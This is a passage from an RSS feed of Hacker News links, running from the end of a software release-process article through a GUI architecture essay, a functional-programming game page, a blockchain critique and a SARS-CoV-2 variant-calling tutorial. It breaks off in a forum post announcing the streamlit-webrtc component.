</p><h3>When to release?</h3><p>It's hard to say exactly. There are few points that you should think of:</p><ul><li><strong>Do not release in rush</strong> - you should have enough time to fix any problem during and after release. There is always something unpredictable that can happen. Maybe you have forgotten to set a new environment variable or a migration has crashed.</li><li>You should release when there are as minimum customers as possible using the product - any error can occur and that can have a negative influence on their experience with the product. Impact on the customer experience could be minimized by using strategies like <a target="_blank" href="https://martinfowler.com/bliki/BlueGreenDeployment.html">blue-green deployment</a> or <a target="_blank" href="https://martinfowler.com/bliki/CanaryRelease.html">canary releases</a>.</li><li>You should be <strong>sure of the code you are releasing</strong>.</li></ul><h3>How often to release?</h3><p>The best option is to <strong>release in periodic intervals</strong>, such as one sprint. Periodicity is one of the most important factors. <strong>You don't want to release hundreds of hours of work at once</strong>. It's much easier to release smaller features <em>more often</em>, than one big feature after two months. Last but not least, there is a customer that wants to see some progress on his project as well. <strong>It's not a problem to release more often then you need to</strong>, but before every release, <strong>don't forget to check the points in the "When to release" paragraph!</strong></p><h2>Conclusion</h2><p>In this article we've walked through the release process by <strong>creating a changelog with minimum effort</strong>. We've talked about a workflow and the tools we are currently using, and our method of creating a release candidate. As always, there is a lot of space to improve, e.g. it would be nice to automatize creating PR from <code>staging</code> to <code>master</code> branch with changelog description.</p></div></div></div>]]>
            </description>
            <link>https://sudolabs.io/blog/automated-release-process-for-lerna-monorepo</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131545</guid>
            <pubDate>Sun, 14 Feb 2021 11:43:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The complexity that lives in the GUI]]>
            </title>
            <description>
<![CDATA[
Score 343 | Comments 191 (<a href="https://news.ycombinator.com/item?id=26131178">thread link</a>) | @yes_but_no
<br/>
February 14, 2021 | https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The user interfaces are a weird thing. There are all sorts of libraries and frameworks that
are supposed to help you on your journey of writing a GUI, but despite all the best practices and
frameworks forcing you to eat your vegetables, the GUI always ends up being a ridiculous mess.
After pondering some more about this topic, I‚Äôve finally realized what is the cause of this problem.</p><p>Suppose you start working on a greenfield project for managing a warehouse (gasp).
This GUI has everything that a warehouse owner desires, including the irrelevant oversized
side bar on the left that scores upvotes on the design related social networks.
The user avatar with the details of logged
in user are on the left, inventory table is in the middle and all kinds of buttons are everywhere else.</p><p>If I asked you to architect such application from the given user interface concept,
you would probably start to mentally compose parts of the GUI into boxes with labels such as:
UserSection, InventoryTable, BottomActionButtons and so on.
These days such labeled boxes are commonly put into separate classes. Classes are a great building
blocks for the GUI, because they let you divide the complexity into smaller parts each containing
just the internal state of one little component.
When you are programming an inventory table in the middle you don‚Äôt want to care about the complexity
surrounding the user avatar section. In other words, if you are organizing the stuff in box A
you don‚Äôt care about the mess that resides in box B.</p><p>For a while this strategy of ‚Äúmess in other boxes is not my problem‚Äù works, but soon enough you hit the next
challenge. Suppose the user section of the warehouse GUI has a little light called ‚ÄúWorking‚Äù.
If the user is editing the inventory table that light should be displayed in green and when the user
stops editing, the light should be turned back to gray.</p><p>Oops, the ‚Äúmess in other boxes‚Äù is your problem now as you have to connect the editing state
of the inventory table with the state of the light in the user avatar section.
You find yourself at the crossroads of important design decisions.</p><ul><li><p><strong>Connect the boxes</strong>: create the user avatar component and pass its instance to the inventory
table component. Whenever the edit state of the inventory table changes, the business logic in
the inventory table should also trigger a state change in the user avatar component with the help
of the user avatar‚Äôs public API.</p></li><li><p><strong>Lift the state up</strong>: move the internal state of the user avatar component
and the state of the inventory table into a separate box/class. The logic of the user avatar
and inventory table component will still be neatly separated in their own boxes,
but they will be able to communicate without inventory table needing the direct access to the user avatar.</p></li><li><p><strong>Introduce a message bus</strong>: connect the inventory table and the user avatar component to the shared
pipe that is used for distributing events in the application. The user avatar component subscribes to
the message bus and every time it receives a table edit event,
it executes an appropriate action (e.g turn the light on).</p></li></ul><p>It goes without saying, that none of the presented options are without problems.</p><h3 id="connect-the-boxes">Connect the boxes</h3><p>If you‚Äôve decided to chicken out of introducing another layer for holding the common state, you may
solve this cross box communication problem by injecting the user avatar component directly into the
inventory table component. The programming theorists and other purists will tell you that this is a bad idea
and you should never even think about it. Think about the <del>children</del>, err,
all the tests that you won‚Äôt be able to write.</p><p>I am definitely guilty of such crime against the Holy Church of Unit Testers. When the project is
still in its infancy and I have yet to figure out what am I even building, I like to jam the
components together without giving it much thought. Sometimes you cut the corners, and sometimes
the corners cut you. How bad could it really be?</p><p>It turns out, for small components this strategy works quite well. As usual, it‚Äôs often the wrong thing
to do when your project grows large and contains hundreds of such inter class communication paths.
Not to mention how injecting hundreds of components is tedious, error prone and ugly to look at.</p><p>In hard times like these, the developers like to reach out for one of the fancy pants
dependency injection frameworks, which supposedly allow you to clean up the
component injection mess. In reality they trade compile time safety for some
convenience and runtime crashes [1]. Now, you have two problems:</p><ol><li>You are still injecting hundreds of components.</li><li>The dependency injection framework randomly breaks and nobody knows why.</li></ol><p>The main reason why I prefer not to use dependency injection frameworks in large projects
is because they tend to make the whole project more convoluted and harder to understand.
It‚Äôs very easy to add just another component injection and not put any effort towards
refactoring the code. This leads to the proliferation of small classes or services,
because the injection framework allows you to do with no upfront investment. You pay for this
crime later on once you have hundreds of injections all over the place and nobody is able to follow
and debug this mesh of small components
(see also <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">On navigating a large codebase</a>).</p><h3 id="lift-the-state-up">Lift the state up</h3><p>A preferred way, where preferred means some kind of handwavy generalization of what
the majority of developers might do, of handling this accidental complexity is by
lifting the state up and storing the state of your component into another box that is
usually called the model. Model View Controller (MVC) gang rejoice.
This pattern allows you to separate the presentation of your data (view) from
the actual data (model), with the use of controller that connects the two together [2].</p><p>Instead of injecting hundreds of components into a god like component that controls all
its children, you put the shared state of the relevant GUI components into a god like model
that controls the state of all those children.
The end result is similar, but separating the data from the view layer might earn you some
positive reviews at the end of the year from the unit test groupies.
Even though you improved the situation a little bit, you still have a huge model that is full of
weird edge cases. The GUIs are inherently a giant state machines and they often get
into a weird state that is only discovered when you are actually running the GUI.</p><p>Maintaining a large and messy model is hard, so you decide to saw the model into smaller models
that group the state of components which conceptually fit together. At some point during this
‚Äúsaw the model‚Äù process you realize that certain things between the two different models should be kept
in sync. The more modern GUI frameworks usually arm you with some kind of data binding abstraction,
which allows to easily propagate data changes from one model to another via the so called one way,
two way data binding.</p><p>Soon enough, you realize that it would be really useful if you could attach a change listener
that would trigger and perform an action on every change of the state object.
Say we would like to change the background color of the user avatar component
every time the working light turns on. The code describing this situation might look something like:</p><div><pre><code data-lang="java"><span>this</span><span>.</span><span>lightTurnedOn</span><span>.</span><span>bind</span><span>(</span><span>this</span><span>.</span><span>editingInventoryTable</span><span>);</span>

<span>this</span><span>.</span><span>lightTurnedOn</span><span>.</span><span>addListener</span><span>((</span><span>oldState</span><span>,</span> <span>lightTurnedOn</span><span>)</span> <span>-&gt;</span> <span>{</span>
    <span>if</span> <span>(</span><span>lightTurnedOn</span><span>)</span> <span>{</span>
        <span>changeBackgroundToRed</span><span>();</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>changeBackgroundToIbmGray</span><span>();</span>
    <span>}</span>
<span>});</span></code></pre></div><p>This is usually the point at which you start losing control of your GUI. Clicking on buttons will start
triggering events which will modify the state in the model that will in turn start triggering event
listeners causing your GUI to flash like a christmas tree. The problem of data bindings and
change listeners is that they make it really easy to introduce a hidden circular event listeners
that will trigger one another multiple times (event A changes state B and change of state B triggers event A).
Such problems are rarely discovered during development, because developers are normally
using powerful machines in comparison to the mortals that are still sticking to their ancient computers.
These problems are also rarely discovered through code reviews, as the state changes are well
hidden within one of those one line state bindings.</p><p>I still don‚Äôt know what the proper solution to this problem would be.
Keep your state manipulations as simple as possible and try not to share any
data between different models. Every time I went forward with some fancy
listener-binding mechanisms, I‚Äôve ended up causing subtle circular listener recalculations
that were extremely hard to debug.</p><h3 id="message-bus">Message bus</h3><p>Congratulations, a large amount of your effort will go towards resolving weird message bus problems
as opposed to writing the business logic of your app. In the beginning, the message bus usually sounds
like a good idea because it simplifies a lot of communication problems between the different UI components.
You can send some events through the pipe and sure enough other parts of your application will react
to them.</p><p>You might be thinking: ‚ÄúMessage bus for communicating between components in the GUI? That‚Äôs crazy!‚Äù
Well, it turns out you can have a message bus that is not a huge ram gobbling process. In fact you are probably
already using it, as the GUI frameworks usually have some sort of an event queue built in that is used
for propagating the events in the system.</p><p>As your application grows you might realize that just spamming messages back and forth causes a lot of
performance problems. In case you have hundreds of components that are generating events, your little
user avatar component might be sifting through hundreds of messages per second while it is
only interested in one. Have no fear, message bus got your back. Any message bus worth their salt
allows you to define different channels that introduce rough message type ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/">https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/the-complexity-that-lives-in-the-gui/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131178</guid>
            <pubDate>Sun, 14 Feb 2021 10:41:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn Functional Programming Visually]]>
            </title>
            <description>
<![CDATA[
Score 333 | Comments 52 (<a href="https://news.ycombinator.com/item?id=26131075">thread link</a>) | @polyrand
<br/>
February 14, 2021 | https://david-peter.de/cube-composer/ | <a href="https://web.archive.org/web/*/https://david-peter.de/cube-composer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="container">
            <p><img src="https://david-peter.de/cube-composer/img/cube-composer.svg" width="200" height="35" alt="cube composer"></p>
            <div id="panel">
                <p><b>Choose level:</b><br>
                
                <b>Goal:</b></p>
                
            </div>
            <div id="message">
                <p><span id="solved">Solved ‚úì</span></p><div><a id="nextlevel"><u>N</u>ext level</a></div>
            </div>
            <canvas id="canvas" width="1600" height="860"></canvas>
            <div id="controls">
                <div>
                    <ul id="available"></ul>
                </div>
                <div>
                    <ul id="program"></ul>
                    <div>
                        <a id="reset"><u>R</u>eset</a>
                    </div>
                </div>
            </div>
            <p>
                A game by <a href="https://david-peter.de/">David Peter</a>. Source code on <a href="https://github.com/sharkdp/cube-composer">GitHub</a>.<br>
                
            </p>
        </div></div>]]>
            </description>
            <link>https://david-peter.de/cube-composer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26131075</guid>
            <pubDate>Sun, 14 Feb 2021 10:25:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why blockchain is not yet working (2018)]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 288 (<a href="https://news.ycombinator.com/item?id=26130912">thread link</a>) | @max_
<br/>
February 14, 2021 | https://as1ndu.xyz/2018/05/why-blockchain-is-not-yet-working/ | <a href="https://web.archive.org/web/*/https://as1ndu.xyz/2018/05/why-blockchain-is-not-yet-working/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h2 id="the-current-state">The current state</h2>
<p>There is a lot of hype about what the global distributed ledger aka ‚ÄúBlockchain‚Äù can do for society.
A ‚Äútrust machine‚Äù as some people call it, that will bring the power of finance, data sovereignty and inclusion to the people,
hence rendering centralized intermediaries like Visa, Barclays &amp; Facebook obsolete.</p>
<p>We shall achieve this by using a combination of robust, battle tested cryptography &amp; game theory.</p>
<p>While this vision is plausible, realising it is not a easy as it may seem.</p>
<p>The blockchain is not yet ready.</p>
<h2 id="the-core-barriers-to-main-stream-adoption">The core barriers to main stream adoption</h2>
<p>The blockchain, while being a new concept in decentralized distributed databases has also presented a very unique set of problems in computer science &amp; economics that have never been solved at the time of this writing.</p>
<p>Is this post, I will talk about the the 6 most important issues only with which if solved, shall we (blockchain enthusiasts) ever achieve our vision.</p>
<h3 id="1-scalability-issues">1. Scalability Issues</h3>
<p>The current bandwidth, i.e the data that can be transmitted through a blockchain with in a given time is simply too bounded for main stream adoption.</p>
<p>Ethereum for instance does a maximum of 13 transactions per second. Visa on the other hand can do 24,000 Transaction per second and peak over 40,000 transactions per second.</p>
<p>So as you can see, the blockchain is thousands of magnitudes unable to manage a global traffic of financial transactions.
This is what they call the ‚ÄúScalability Problem‚Äù</p>
<p>Coming up with a solution to scalability the problems without tarnishing the original value propositions of a blockchain (immutability/security, decentralization &amp; censorship resistance) is not trivial. It has been nick named the <a href="https://github.com/ethereum/wiki/wiki/Sharding-FAQ#this-sounds-like-theres-some-kind-of-scalability-trilemma-at-play-what-is-this-trilemma-and-can-we-break-through-it">‚Äúscalability trilemma‚Äù</a> by Vitalik Buterine (Ethereum‚Äôs co-author).</p>
<h3 id="2-lack-of-intuitive-private-key-management">2. Lack of Intuitive Private Key Management</h3>
<p>Ordinary users will simply never wrap their heads around private keys.</p>
<p>Private keys, which are a string of text used to sign transactions and make other proofs(cryptographic).</p>
<p>The purpose for these proofs or signatures is for other entities on a blockchain network to verify identities &amp; messages amongst themselves without reasonable doubt.</p>
<p>Private keys have two main problems first, how to store them securely.<br>
Anyone who can memorize, take a picture, or copy your private key can literally steal all your money.
Because they have your private key, they can make the cryptographic proofs/signatures and <em>accurately prove to everyone on the network they are you</em> even without your consent. Even when they are not you.</p>
<p>Second, you loose your key you loose access to all your money &amp; <em>no one can ever help you out</em>.
There is no ‚Äúclick here to remember your private key‚Äù</p>
<p>We need to first come up with something as intuitive using ATM/Debit cards.</p>
<p>Imagine if your bank told you that, ‚Äúif you forgot your Debit card PIN, you loose access to all your money with <em>zero hope of recovering it how ever large a sum of money it would be</em>‚Äù.</p>
<p>If the above was the case, I don‚Äôt think any one would use debit cards.</p>
<h3 id="3-contract-security">3. Contract security</h3>
<p>It is simply not reliable &amp; safe for responsible institutions &amp; individuals to deploy smart contracts on blockchains like Ethereum.</p>
<p>Due to the blockchain having an immutable and unpredictable state, Smart contracts deployed on such a platform are also expected to suffer from immutable bugs &amp; unpredictable events.</p>
<p>As a result, millions of dollars have been lost in events such as the <a href="https://www.bloomberg.com/features/2017-the-ether-thief/">theft of $50 million from TheDAO</a> and <a href="https://www.coindesk.com/startup-lost-160-million-still-wants-shake-ethereum/"> Parity‚Äôs $160 Million loss of funds</a></p>
<p>I was glad that Rick dudley <a href="https://youtu.be/1AGHAuWz_4U?t=986">talked about this</a></p>
<h3 id="4-consensus-algorithms-are-wack">4. Consensus algorithms are wack</h3>
<p>The popular blockchains only don‚Äôt offer transaction finality i.e you will never be 100% sure that you have gotten funds.</p>
<p>You can only be <a href="https://ethereum.stackexchange.com/questions/319/what-number-of-confirmations-is-considered-secure-in-ethereum">probabilistically to a high degree</a> (but with zero guarantee) that you have received your funds.
This is because in major consensus algorithm called Nakamoto Consensus, the miners elect the chain with the most computational work that are with in the same protocol i.e consensus rules.</p>
<p>For instance imagine your bank tells you that you that, ‚Äúthere is a 95% chance that we <em>might</em> have your life savings, however you may also not poses it in 5 years in case we discovered that the chain with the most work does not have your transaction in it‚Äù</p>
<p>Yes, I don‚Äôt think anyone wants to keep their life savings in such a bank.</p>
<h3 id="5-privacy">5. Privacy</h3>
<p>Just by knowing someone‚Äôs cryptocurrency address, you can know their account balance &amp; transaction history simply by pasting it in a blockchain explorer like <a href="https://blockchain.info/">blockchain</a> and <a href="https://etherscan.io/">etherscan</a></p>
<p>Meaning it‚Äôs very easy for anyone to keep track of your financial activities without permission.</p>
<p>You buy HIV drugs? I now know your HIV positive, Your paying schools fees? now your local kidnapper knows where your kids study.</p>
<p>Buying birth control pills? Now anyone in the world may accurately guess that your a woman.
No careful person wants that!</p>
<h3 id="6-price-volatility">6. Price volatility</h3>
<p>Very few people simply don‚Äôt have the stomach to hold a financial instrument that drops by over 50% with in <a href="https://www.cnbc.com/2017/12/26/bitcoin-price-in-2018-could-hit-60000-but-another-crash-is-coming.html">a few months</a>.</p>
<h2 id="what-can-we-do">What can we do?</h2>
<p>Most projects are building on platforms that have these problems regardless, in hopes that they will integrate solutions to the respective issues in the future.</p>
<p>The risk they face however, is that the platform they built on, my become obsolete after a heavy investment of time &amp; resources on the wrong platform.</p>
<p>Think how the <a href="https://bitcoinmagazine.com/articles/bitcoin-now-useless-micropayments-solutions-are-coming1/">micro payments industry died in bitcoin because of high fees</a></p>
<p>It‚Äôs like building your phone app around a windows smart-phone only to be made irrelevant because the next generation of mobile users will not be using windows smart-phones, but iOS and Android.</p>
</div></div>]]>
            </description>
            <link>https://as1ndu.xyz/2018/05/why-blockchain-is-not-yet-working/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130912</guid>
            <pubDate>Sun, 14 Feb 2021 09:45:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Burrows-Wheeler transform to identify SARS-CoV-2 mutants]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26130544">thread link</a>) | @8iterations
<br/>
February 14, 2021 | https://mokasquarl.github.io/draftWA_cov/ | <a href="https://web.archive.org/web/*/https://mokasquarl.github.io/draftWA_cov/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h3 id="a-bioinformatics-pipeline-to-detect--understand-covid-mutants">A Bioinformatics Pipeline to Detect &amp; Understand COVID Mutants</h3>
<p><img src="https://mokasquarl.github.io/images/composite_border.png" alt="mutantcov" title="Mutant SARS-CoV-2 ACE2 Receptor Complex"></p>
<h4 id="fig-1-molecular-structure-with-uk-mutant-sars-cov-2-docked-to-human-receptor">Fig 1. Molecular Structure with UK Mutant SARS-CoV-2 Docked to Human Receptor</h4>
<p>As the pandemic runs its course, tracking genetic mutations has gained mainstream coverage. Officially, in the line of work we call bioinformatics, finding and understanding mutations is known as <em>Variant Calling</em>. In the same way every person is different from others (except twins), an individual virus can have variations in their genome; when a lot of these genetic variations accumulate between the virus we detected originally and what we find months later in a faraway town, we can say that we have a new <em>strain</em> of the virus. The Coronavirus which we‚Äôre now calling <em>SARS-CoV-2</em> was first detected in Wuhan‰∏≠ÂõΩ, so the genetic sequencing data from here is used as the base reference genome, and we measure mutations for the virus detected everywhere else against this; a coronavirus genome from a few towns away might only have a couple letters of the genome different from the Wuhan data, while something that‚Äôs travelled to the other side of the world after being transmitted through many people, climates, and even treatments, might now have acquired many more genetic variants compared to the original data.</p>
<h4 id="fig-2-retrieving-raw-covid-data-from-sra--creating-alignment-maps">Fig 2. Retrieving raw COVID data from SRA &amp; creating alignment maps</h4>
<p><img src="https://mokasquarl.github.io/images/render1612723995528-min.gif" alt="samtools tview" title="SARS-CoV-2 Aligned">
Data from viruses sequenced all across the world are uploaded into one of several databases (Table 1), this data is generated directly from machines by Illumina, Oxford Nanopore, or Life Technologies. When turning the molecules in genetic code into digital files these machines create strings that can be a few hundred letters in length to several thousand, but never the entire genome of the virus in a single string. A standardized file format called <em>fastq</em> holds all the strings from a single sample, including some quality data from the machine doing the sequencing. These strings are in no particular order, and first need to be mapped together to get the complete genome. Pretty much the standard way to create these genetic maps uses a technique invented in Palo Alto back in the early 90s by &nbsp;Michael Burrows and David Wheeler. The <em>Burrows‚ÄìWheeler Transform</em> was mostly just used in data compression, until around 2010 when computational biologists began to use it to align genomes together.</p>

<h4 id="table-1">Table 1.</h4>
<p><strong>SRA:</strong> <em>Sequence Read Archive</em> <strong>-Open Access</strong></p>

<p><strong>ENA:</strong> <em>European Nucleotide Archive</em> <strong>-Open Access</strong></p>

<p><strong>GISAID:</strong> <em>Global Initiative on Sharing All Influenza Data</em> <strong>-Private</strong></p>

<p>Heng Li, now a professor at Harvard (amongst other things) has created the most commonly used alignment algorithm (amongst other things) with <a href="https://github.com/lh3/bwa">BWA</a>. This algorithm is super easy to use, and will get us results that are more than good enough.</p>

<div><div><pre><code>git clone https://github.com/lh3/bwa.git
cd bwa
make
</code></pre></div></div>

<p>BWA takes <strong>fastq</strong> files containing samples, along with a <em>fasta</em> file containing a reference genome to map the strings contained in our <strong>fastq</strong> file. Reference genomes are usually put out by the scientific wing of a National Government, Regional Organizations, and some Universities. We‚Äôll get our Wuhan Coronavirus Reference genome from the <a href="https://www.ncbi.nlm.nih.gov/nuccore/1798174254">National Center for Biotechnology Information</a> hosted by the US Federal government. A good sample to run against the Wuhan reference is the Washington state outbreak that happened early in the US, the <em>fastq</em> data for this is also hosted by the NCBI at their <a href="https://trace.ncbi.nlm.nih.gov/Traces/sra/?run=SRR11278092">Sequence Read Archive</a>. In the animated terminal above (Fig 2.) we see the commands needed to create our mapped genome from our input files, including retrieving the data from the databases . If you‚Äôd like to skip all that, we‚Äôre hosting both the reference genome, and the completed alignment map over at <a href="https://lucidalign.com/#cov">Lucid Align</a>. We‚Äôll be using the <strong>bam</strong> file to detect our mutations, and we can also browse the genome of this Washington state outbreak sample using any sequence alignment viewer.</p>

<h4 id="fig-3-detecting-mutations-with-neural-network">Fig 3. Detecting Mutations with Neural Network</h4>
<p>
  <iframe src="https://www.youtube.com/embed/v5z5OV6UAVM" width="700" height="480" frameborder="0" allowfullscreen="">
  </iframe>
</p>

<p>But before going on to variant calling this first sample let‚Äôs just prepare another sample while we‚Äôre making these alignment maps. Let‚Äôs do a more recent outbreak, from Kent, UK; which is far from Wuhan &amp; the Washington sample, in both time &amp; space. Retrieving the samples from the European Nucleotide Archive can be done from this <a href="https://www.ebi.ac.uk/ena/browser/view/ERR4659819">link</a> or from the shell.</p>

<div><div><pre><code>git clone https://github.com/enasequence/enaBrowserTools.git
cd python3
enaDataGet.py -f fastq -m -d [output_directory] ERR4659819
</code></pre></div></div>

<p>Creating the mapped genome from the Kent, UK outbreak is done the exact same way as with the Washington state outbreak, and now both files can be browsed directly with an alignment viewer. More importantly now we can run the <em>variant detection</em> and see all the mutations in each of these samples compared to the original Wuhan reference genome. Variant callers are an area of hot development for folks working on bioinformatics algorithms &amp; tools. Traditionally, Bayesian methods have been most reliable, but are hard-coded for specific organisms or need the settings dialed-in to get the correct sensitivity to specificity. This is so that we don‚Äôt get too many false-positives, while at the same time don‚Äôt miss any real mutations. In the last couple of years deep convolutional neural networks have really made a splash in variant calling, where now images are created almost similar to those we see from alignment viewers, and those images are used to train, and then have the neural network make the call on whether there is a mutation in a given section of the alignment map as we make our way down the entire map.</p>

<p><img src="https://mokasquarl.github.io/images/eff_kent.png" alt="Annotated VCF" title="High Impact mutation in Kent UK sample"></p>
<h4 id="fig-4-annotated-mutations-of-kent-uk-strain-b117">Fig 4. Annotated Mutations of Kent UK Strain B.1.1.7</h4>

<p>Bayesian variant callers are fairly simple to install, whereas the DCNN callers will need, in our case, Nvidia cuda drivers, and of course a machine with those GPUs. You could use <a href="https://magnolia.sh/">Magnolia</a> Fig 3., the super-cool neural network based caller that Leo van Driel helped write B-), but for this post we are going to use the built-in caller that comes with <a href="http://www.htslib.org/download/"><em>samtools</em></a> written by the previously mentioned Heng Li.</p>

<div><div><pre><code>bcftools mpileup -Ou -f &lt;ref.fasta&gt; &lt;sample1.bam&gt; | bcftools call -vmO z -o &lt;study.vcf.gz&gt;
</code></pre></div></div>

<p>After running any variant caller, we‚Äôre left with a <em>vcf</em> file, which is just a list of positions in a genome where the sample has a mutation compared to the reference, it might be good to just look at the file <a href="https://samtools.github.io/hts-specs/VCFv4.2.pdf">format specifications</a> to understand how these <em>vcf</em> files will be used moving forward. We can use the allotted fields in the <em>vcf</em> format to annotate, that is give meaning &amp; context to each of the mutations we detect in the genome. For this sample we‚Äôve used <a href="https://pcingola.github.io/SnpEff/users_of_snpeff/">SnpEff</a> which makes life super easy by boiling all of the predicted effects of each of the mutations we detected into 3 simple categories, high impact, low, and moderate.</p>

<p>We can see in Fig 4. that running a standard Bayesian variant caller we detected a total of 48 mutations in the Kent UK sample. However, there might be some false-positives in there, it‚Äôs always better to be a bit more sensitive than to miss things. Let‚Äôs focus on the high impact mutations, things that will change the 3D structure of coronavirus. Looks like we only have 3 of those, all highlighted in red (Fig 4.), at genomic positions, 11288, 27972, and 28270. The VCF file we generated also contains data on which amino acids within the protein structure were changed to what, we can use that information to make the changes in our molecular structure, which in this case we‚Äôve done with a current tool under development.</p>
<h4 id="fig-5-molecular-structure-editor">Fig 5. Molecular Structure Editor</h4>
<p><img src="https://mokasquarl.github.io/images/dalton_beta.gif" alt="Dalton PDB" title="Editing Molecular Structure"></p>

<p>Mutations which change the molecular structure are super important because that is more likely to make things behave differently, this can mean it attaches to human receptors more tightly, interacts with antibodies and drugs differently, because remember at the core of how molecules behave is the old mantra <strong>‚Äúform equals function.</strong>‚Äù</p>

  </div></div>]]>
            </description>
            <link>https://mokasquarl.github.io/draftWA_cov/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26130544</guid>
            <pubDate>Sun, 14 Feb 2021 08:15:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Streamlit component for real-time video processing web apps, streamlit-webrtc]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26130494">thread link</a>) | @whitphx
<br/>
February 14, 2021 | https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669 | <a href="https://web.archive.org/web/*/https://discuss.streamlit.io/t/new-component-streamlit-webrtc-a-new-way-to-deal-with-real-time-media-streams/8669">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          

            

          <p><span>
              <meta itemprop="datePublished" content="2021-01-10T13:33:16Z">
              <time itemprop="dateModified" datetime="2021-01-11T12:54:45Z">
                January 11, 2021, 12:54pm
              </time>
          <span itemprop="position">#1</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Hello everyone,</p>
<p>I made <a href="https://github.com/whitphx/streamlit-webrtc" rel="noopener nofollow ugc">streamlit-webrtc</a>, which sends and receives video (and audio, but it‚Äôs only partially supported now) streams between frontend and backend via WebRTC.<br>
This should be helpful for creating, for example, performant real-time computer vision WebApps.</p>
<p>This week I tried Steamlit, found it interesting and useful, and then wanted to run real-time computer vision apps on Streamlit, on which users can try some computer vision models with video input from their webcams.<br>
So I tried to develop a component to achieve it using WebRTC. Fortunately, there is a great WebRTC library for Python, <a href="https://github.com/aiortc/aiortc" rel="noopener nofollow ugc">aiortc</a>.</p>
<p>One interesting thing about this component is that the input video streams are sourced from users‚Äô webcams and transferred to the server-side Python process via the network. Therefore, the server does not need the access to the camera, unlike the usual approach using OpenCV (<code>cv2.VideoCapture</code>). It means the Python code can be hosted on a remote server (actually, I hosted a sample app on Heroku and it worked, as stated below).</p>
<p>In addition, WebRTC provides good performance with sending and receiving video/audio frames.</p>
<p>Here is a demo movie:<br>
</p><div><a href="https://aws1.discourse-cdn.com/business7/uploads/streamlit/original/2X/a/af111a7393c77cb69d7712ac8e71ca862feaeb24.gif" data-download-href="/uploads/short-url/oYIcsMqSqHFlA92m5f3NdANeujO.gif?dl=1" title="streamlit-webrtc-demo-short1" rel="noopener nofollow ugc"><img src="https://aws1.discourse-cdn.com/business7/uploads/streamlit/original/2X/a/af111a7393c77cb69d7712ac8e71ca862feaeb24.gif" alt="streamlit-webrtc-demo-short1" data-base62-sha1="oYIcsMqSqHFlA92m5f3NdANeujO" width="549" height="500" data-small-upload="https://aws1.discourse-cdn.com/business7/uploads/streamlit/optimized/2X/a/af111a7393c77cb69d7712ac8e71ca862feaeb24_2_10x10.png"></a></div><p>
(A full version is hosted on <a href="https://youtu.be/BRrtN80ITfU" rel="noopener nofollow ugc">YouTube</a>)</p>
<p>You can see</p>
<ul>
<li>The app consumes, processes, and renders video frames in real time.</li>
<li>Streamlit‚Äôs interactive controls are still working well in combination with the code using WebRTC. For example, the threshold for object detection is changed interactively during execution.</li>
</ul>
<p>You can try out the sample app using the following commands.</p>
<pre><code>$ pip install streamlit-webrtc opencv-python
$ streamlit run https://raw.githubusercontent.com/whitphx/streamlit-webrtc-example/main/app.py
</code></pre>
<p>I also deployed it to Heroku, <a href="https://streamlit-webrtc-example.herokuapp.com/" rel="noopener nofollow ugc">https://streamlit-webrtc-example.herokuapp.com/</a> and confirmed it worked; however, it‚Äôs running on a very small instance on a free plan, and may not work well if multiple users access it at the same time.<br>
I recommend you to run it on your own environment.</p>
<p>It‚Äôs still a prototype and the API is not finalized, and the documentation has not been written. Please refer to <a href="https://github.com/whitphx/streamlit-webrtc/blob/master/app.py" rel="noopener nofollow ugc">the sample code</a> when you use the component.</p>
<p>I welcome any feedback!</p>
        </div>

        <meta itemprop="headline" content="New Component: streamlit-webrtc, a new way to deal with real-time media streams">
          <meta itemprop="keywords" content="custom-components, video, real-time, computer-vision">

        

         

            
      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://discuss.streamlit.io/u/whitphx"><span itemprop="name">whitphx</span></a>
            
          </span></p>


          <p><span>
              <meta itemprop="datePublished" content="2021-01-10T14:39:49Z">
              <time itemprop="dateModified" datetime="2021-01-10T16:53:31Z">
                January 10, 2021,  4:53pm
              </time>
          <span itemprop="position">#2</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>Technical note:</p>
<p>One technical challenge was to combine WebRTC and real-time processing with Streamlit‚Äôs execution model. This problem has already been stated in <a href="https://discuss.streamlit.io/t/access-webcam-video-from-a-hosted-streamlit-application/1301">Access Webcam Video from a hosted Streamlit application</a>.<br>
